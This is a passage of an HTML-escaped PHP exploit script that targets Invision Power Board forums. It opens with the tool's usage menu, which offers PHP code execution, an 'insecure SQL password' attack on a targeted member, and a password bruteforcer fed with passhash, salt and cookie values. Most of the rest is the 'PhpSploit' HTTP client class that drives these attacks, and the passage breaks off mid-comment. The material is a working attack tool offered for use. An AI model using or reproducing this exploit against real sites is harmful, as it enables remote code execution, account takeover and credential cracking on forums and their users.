&nbsp;&#123;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n -attack &lt;int_choice&gt; &lt;params&gt; &#91;options&#93;\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; 1 - PHP code execution\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -url&nbsp; &nbsp; &nbsp; &nbsp; IPB url with ending slash\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -uname&nbsp; &nbsp; &nbsp; targeted username\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -uid&nbsp; &nbsp; &nbsp; &nbsp; OR the targeted user id &#40;def: 1&#41;\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -prefix&nbsp; &nbsp; &nbsp;sql table prefix &#40;def: ibf_&#41;\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -acp&nbsp; &nbsp; &nbsp; &nbsp; admin control panel path &#40;def: admin&#41;\n\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; 2 - Insecure SQL password usage\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -ip&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;your current IP\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -dict&nbsp; &nbsp; &nbsp; &nbsp;a wordlist file\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -url&nbsp; &nbsp; &nbsp; &nbsp; IPB url with ending slash\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -uname&nbsp; &nbsp; &nbsp; a valid member username\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -pwd&nbsp; &nbsp; &nbsp; &nbsp; the associated password\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -uid&nbsp; &nbsp; &nbsp; &nbsp; OR&nbsp; the targeted member id\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -passhash&nbsp; &nbsp;the passhash cookie value\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -stronghold the stronghold cookie value\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -sqlusr&nbsp; &nbsp; &nbsp;you can precise the sql user\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -prefix&nbsp; &nbsp; &nbsp;sql table prefix &#40;def: ibf_&#41;\n\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; 3 - Password bruteforcer\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -dict&nbsp; &nbsp; &nbsp; &nbsp;a wordlist file\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -url&nbsp; &nbsp; &nbsp; &nbsp; IPB url with ending slash\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -uname&nbsp; &nbsp; &nbsp; targeted username\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -uid&nbsp; &nbsp; &nbsp; &nbsp; OR&nbsp; the targeted user id &#40;def: 1&#41;\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -prefix&nbsp; &nbsp; &nbsp;sql table prefix &#40;def: ibf_&#41;\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -passhash&nbsp; &nbsp;OR the passhash value\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -salt&nbsp; &nbsp; &nbsp; &nbsp;the salt value\n\n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; Optional: \n\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -proxhost &lt;ip&gt;&nbsp; &nbsp; &nbsp; &nbsp;if you wanna use a proxy\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;&nbsp; &nbsp; -proxauth &lt;usr:pwd&gt;&nbsp; proxy with authentication\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&#125;<br /><br /><br /><br />/*<br />&nbsp;* <br />&nbsp;* Copyright &#40;C&#41; darkfig<br />&nbsp;* <br />&nbsp;* This program is free software; you can redistribute it and/or <br />&nbsp;* modify it under the terms of the GNU General Public License <br />&nbsp;* as published by the Free Software Foundation; either version 2 <br />&nbsp;* of the License, or &#40;at your option&#41; any later version. <br />&nbsp;* <br />&nbsp;* This program is distributed in the hope that it will be useful, <br />&nbsp;* but WITHOUT ANY WARRANTY; without even the implied warranty of <br />&nbsp;* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.&nbsp; See the <br />&nbsp;* GNU General Public License for more details. <br />&nbsp;* <br />&nbsp;* You should have received a copy of the GNU General Public License <br />&nbsp;* along with this program; if not, write to the Free Software <br />&nbsp;* Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA&nbsp; 02111-1307, USA.<br />&nbsp;* <br />&nbsp;* TITLE:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PhpSploit Class<br />&nbsp;* REQUIREMENTS:&nbsp; &nbsp;PHP 4 / PHP 5<br />&nbsp;* VERSION:&nbsp; &nbsp; &nbsp; &nbsp; 2.1<br />&nbsp;* LICENSE:&nbsp; &nbsp; &nbsp; &nbsp; GNU General Public License<br />&nbsp;* ORIGINAL URL:&nbsp; &nbsp;http://www.acid-root.new.fr/tools/03061230.txt<br />&nbsp;* FILENAME:&nbsp; &nbsp; &nbsp; &nbsp;phpsploitclass.php<br />&nbsp;*<br />&nbsp;* CONTACT:&nbsp; &nbsp; &nbsp; &nbsp; gmdarkfig@gmail.com &#40;french / english&#41;<br />&nbsp;* GREETZ:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Sparah, Ddx39<br />&nbsp;*<br />&nbsp;* DESCRIPTION:<br />&nbsp;* The phpsploit is a class implementing a web user agent.<br />&nbsp;* You can add cookies, headers, use a proxy server with &#40;or without&#41; a<br />&nbsp;* basic authentification. It supports the GET and the POST method. It can<br />&nbsp;* also be used like a browser with the cookiejar&#40;&#41; function &#40;which allow<br />&nbsp;* a server to add several cookies for the next requests&#41; and the<br />&nbsp;* allowredirection&#40;&#41; function &#40;which allow the script to follow all<br />&nbsp;* redirections sent by the server&#41;. It can return the content &#40;or the<br />&nbsp;* headers&#41; of the request. Others useful functions can be used for debugging.<br />&nbsp;* A manual is actually in development but to know how to use it, you can<br />&nbsp;* read the comments.<br />&nbsp;*<br />&nbsp;* CHANGELOG:<br />&nbsp;*<br />&nbsp;* &#91;2008-08-29&#93; &#40;2.1&#41;<br />&nbsp;*&nbsp; * New: The showheader&#40;&#41;/showcookie&#40;&#41; functions can now return an array<br />&nbsp;*&nbsp; * Bug #3 fixed: Problem concerning some servers for the main function<br />&nbsp;*<br />&nbsp;* &#91;2007-06-10&#93; &#40;2.0&#41;<br />&nbsp;*&nbsp; * Code: Code optimization<br />&nbsp;*&nbsp; * New: Compatible with PHP 4 by default<br />&nbsp;*<br />&nbsp;* &#91;2007-01-24&#93; &#40;1.2&#41;<br />&nbsp;*&nbsp; * Bug #2 fixed: Problem concerning the getcookie&#40;&#41; function &#40;&#40;|;&#41;&#41;<br />&nbsp;*&nbsp; * New: multipart/form-data enctype is now supported <br />&nbsp;*<br />&nbsp;* &#91;2006-12-31&#93; &#40;1.1&#41;<br />&nbsp;*&nbsp; * Bug #1 fixed: Problem concerning the allowredirection&#40;&#41; function &#40;chr&#40;13&#41; bug&#41;<br />&nbsp;*&nbsp; * New: You can now call the getheader&#40;&#41; / getcontent&#40;&#41; function without parameters<br />&nbsp;*<br />&nbsp;* &#91;2006-12-30&#93; &#40;1.0&#41;<br />&nbsp;*&nbsp; * First version<br />&nbsp;* <br />&nbsp;*/<br /><br />class phpsploit<br />&#123;<br />&nbsp; &nbsp;var $proxyhost;<br />&nbsp; &nbsp;var $proxyport;<br />&nbsp; &nbsp;var $host;<br />&nbsp; &nbsp;var $path;<br />&nbsp; &nbsp;var $port;<br />&nbsp; &nbsp;var $method;<br />&nbsp; &nbsp;var $url;<br />&nbsp; &nbsp;var $packet;<br />&nbsp; &nbsp;var $proxyuser;<br />&nbsp; &nbsp;var $proxypass;<br />&nbsp; &nbsp;var $header;<br />&nbsp; &nbsp;var $cookie;<br />&nbsp; &nbsp;var $data;<br />&nbsp; &nbsp;var $boundary;<br />&nbsp; &nbsp;var $allowredirection;<br />&nbsp; &nbsp;var $last_redirection;<br />&nbsp; &nbsp;var $cookiejar;<br />&nbsp; &nbsp;var $recv;<br />&nbsp; &nbsp;var $cookie_str;<br />&nbsp; &nbsp;var $header_str;<br />&nbsp; &nbsp;var $server_content;<br />&nbsp; &nbsp;var $server_header;<br />&nbsp; &nbsp;<br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function is called by the<br />&nbsp; &nbsp; * get&#40;&#41;/post&#40;&#41;/formdata&#40;&#41; functions.<br />&nbsp; &nbsp; * You don't have to call it, this is<br />&nbsp; &nbsp; * the main function.<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access private<br />&nbsp; &nbsp; * @return string $this-&gt;recv ServerResponse<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function sock&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!empty&#40;$this-&gt;proxyhost&#41; &amp;&amp; !empty&#40;$this-&gt;proxyport&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$socket = @fsockopen&#40;$this-&gt;proxyhost,$this-&gt;proxyport&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$socket = @fsockopen&#40;$this-&gt;host,$this-&gt;port&#41;;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!$socket&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;die&#40;&quot;Error: Host seems down&quot;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;method=='get'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet = 'GET '.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;elseif&#40;$this-&gt;method=='post' or $this-&gt;method=='formdata'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet = 'POST '.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;die&#40;&quot;Error: Invalid method&quot;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!empty&#40;$this-&gt;proxyuser&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= 'Proxy-Authorization: Basic '.base64_encode&#40;$this-&gt;proxyuser.':'.$this-&gt;proxypass&#41;.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!empty&#40;$this-&gt;header&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= $this-&gt;showheader&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!empty&#40;$this-&gt;cookie&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= 'Cookie: '.$this-&gt;showcookie&#40;&#41;.&quot;\r\n&quot;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= 'Host: '.$this-&gt;host.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;method=='post'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= 'Content-Length: '.strlen&#40;$this-&gt;data&#41;.&quot;\r\n\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;elseif&#40;$this-&gt;method=='formdata'&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat&#40;'-',27&#41;.$this-&gt;boundary.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= 'Content-Length: '.strlen&#40;$this-&gt;data&#41;.&quot;\r\n\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= $this-&gt;data;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;packet .= &quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;recv = '';<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;fputs&#40;$socket, $this-&gt;packet&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;while&#40;!feof&#40;$socket&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;recv .= fgets&#40;$socket&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;fclose&#40;$socket&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;cookiejar&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;getcookie&#40;&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;allowredirection&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;getredirection&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;recv;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function allows you to add several<br />&nbsp; &nbsp; * cookies in the request.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string cookn CookieName<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string cookv CookieValue<br />&nbsp; &nbsp; * @example $this-&gt;addcookie&#40;'name','value'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function addcookie&#40;$cookn,$cookv&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$this-&gt;cookie&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie = array&#40;&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie&#91;$cookn&#93; = $cookv;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function allows you to add several<br />&nbsp; &nbsp; * headers in the request.<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string headern HeaderName<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string headervalue Headervalue<br />&nbsp; &nbsp; * @example $this-&gt;addheader&#40;'Client-IP', '128.5.2.3'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function addheader&#40;$headern,$headervalue&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$this-&gt;header&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;header = array&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;header&#91;$headern&#93; = $headervalue;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function allows you to use an<br />&nbsp; &nbsp; * http proxy server. Several methods<br />&nbsp; &nbsp; * are supported.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string proxy ProxyHost<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;integer proxyp ProxyPort<br />&nbsp; &nbsp; * @example $this-&gt;proxy&#40;'localhost',8118&#41;<br />&nbsp; &nbsp; * @example $this-&gt;proxy&#40;'localhost:8118'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function proxy&#40;$proxy,$proxyp=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;empty&#40;$proxyp&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$proxarr = explode&#40;':',$proxy&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxyhost = $proxarr&#91;0&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxyport = &#40;int&#41;$proxarr&#91;1&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxyhost = $proxy;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxyport = &#40;int&#41;$proxyp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;$this-&gt;proxyport &gt; 65535&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;die&#40;&quot;Error: Invalid port number&quot;&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function allows you to use an<br />&nbsp; &nbsp; * http proxy server which requires a<br />&nbsp; &nbsp; * basic authentification. Several<br />&nbsp; &nbsp; * methods are supported:<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string proxyauth ProxyUser<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string proxypass ProxyPass<br />&nbsp; &nbsp; * @example $this-&gt;proxyauth&#40;'user','pwd'&#41;<br />&nbsp; &nbsp; * @example $this-&gt;proxyauth&#40;'user:pwd'&#41;;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function proxyauth&#40;$proxyauth,$proxypass=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;empty&#40;$proxypass&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$posvirg = strpos&#40;$proxyauth,':'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxyuser = substr&#40;$proxyauth,0,$posvirg&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxypass = substr&#40;$proxyauth,$posvirg+1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxyuser = $proxyauth;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;proxypass = $proxypass;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function allows you to set<br />&nbsp; &nbsp; * the 'User-Agent' header.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string useragent Agent<br />&nbsp; &nbsp; * @example $this-&gt;agent&#40;'Firefox'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function agent&#40;$useragent&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;addheader&#40;'User-Agent',$useragent&#41;;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function returns the headers<br />&nbsp; &nbsp; * which will be in the next request.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;header_str Headers<br />&nbsp; &nbsp; * @return&nbsp; array&nbsp; $this-&gt;head Headers<br />&nbsp; &nbsp; * @example $this-&gt;showheader&#40;&#41;<br />&nbsp; &nbsp; * @example $this-&gt;showheader&#40;1&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function showheader&#40;$array=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;header_str = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$this-&gt;header&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!empty&#40;$array&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;header;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40;$this-&gt;header as $name =&gt; $value&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;header_str .= $name.': '.$value.&quot;\r\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;header_str;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function returns the cookies<br />&nbsp; &nbsp; * which will be in the next request.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;cookie_str Cookies<br />&nbsp; &nbsp; * @return&nbsp; array&nbsp; $this-&gt;cookie Cookies<br />&nbsp; &nbsp; * @example $this-&gt;showcookie&#40;&#41;<br />&nbsp; &nbsp; * @example $this-&gt;showcookie&#40;1&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function showcookie&#40;$array=''&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$this-&gt;cookie&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&nbsp; &nbsp; <br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!empty&#40;$array&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;cookie;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie_str = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40;$this-&gt;cookie as $name =&gt; $value&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cookie_str .= $name.'='.$value.'; ';<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;cookie_str;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function returns the last<br />&nbsp; &nbsp; * formed http request.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;packet HttpPacket<br />&nbsp; &nbsp; * @example $this-&gt;showlastrequest&#40;&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function showlastrequest&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40;!isset&#40;$this-&gt;packet&#41;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;packet;<br />&nbsp; &nbsp;&#125;<br /><br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function sends the formed<br />&nbsp; &nbsp; * http packet with the GET method.<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string url Url<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;sock&#40;&#41;<br />&nbsp; &nbsp; * @example $this-&gt;get&#40;'localhost/index.php?var=x'&#41;<br />&nbsp; &nbsp; * @example $this-&gt;get&#40;'http://localhost:88/tst.php'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */<br />&nbsp; &nbsp;function get&#40;$url&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;target&#40;$url&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;method = 'get';<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;sock&#40;&#41;;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;<br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function sends the formed<br />&nbsp; &nbsp; * http packet with the POST method.<br />&nbsp; &nbsp; *<br />&nbsp; &nbsp; * @access&nbsp; public<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string url&nbsp; Url<br />&nbsp; &nbsp; * @param&nbsp; &nbsp;string data PostData<br />&nbsp; &nbsp; * @return&nbsp; string $this-&gt;sock&#40;&#41;<br />&nbsp; &nbsp; * @example $this-&gt;post&#40;'http://localhost/','helo=x'&#41;<br />&nbsp; &nbsp; * <br />&nbsp; &nbsp; */&nbsp; &nbsp;<br />&nbsp; &nbsp;function post&#40;$url,$data&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;target&#40;$url&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;method = 'post';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data = $data;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;sock&#40;&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br /><br />&nbsp; &nbsp;/**<br />&nbsp; &nbsp; * This function sends the formed http<br 